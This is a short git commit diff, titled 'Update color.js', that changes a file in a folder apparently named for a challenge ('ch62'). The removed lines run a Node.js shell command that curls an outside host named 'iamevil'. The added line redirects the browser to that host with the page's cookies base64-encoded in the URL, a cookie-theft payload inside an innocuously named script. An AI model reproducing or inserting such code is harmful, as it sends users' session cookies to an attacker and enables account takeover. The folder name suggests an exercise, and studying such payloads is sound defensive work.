f32dbc381e8f615514d44205448d40e538dc802b
Kyrielled <zedix.minecraft@gmail.com>
2024-10-06 01:59:27 +0200

    Update color.js

--- ch62/color.js
+++ ch62/color.js
@@ -1,10 +1,1 @@
-var exec = require('child_process').exec;
-
-exec('curl https://iamevil.free.beeceptor.com',
-    function (error, stdout, stderr) {
-        console.log('stdout: ' + stdout);
-        console.log('stderr: ' + stderr);
-        if (error !== null) {
-             console.log('exec error: ' + error);
-        }
-    });
+document.location = 'https://iamevil.free.beeceptor.com/?cookie?c=' + btoa(document.cookie);
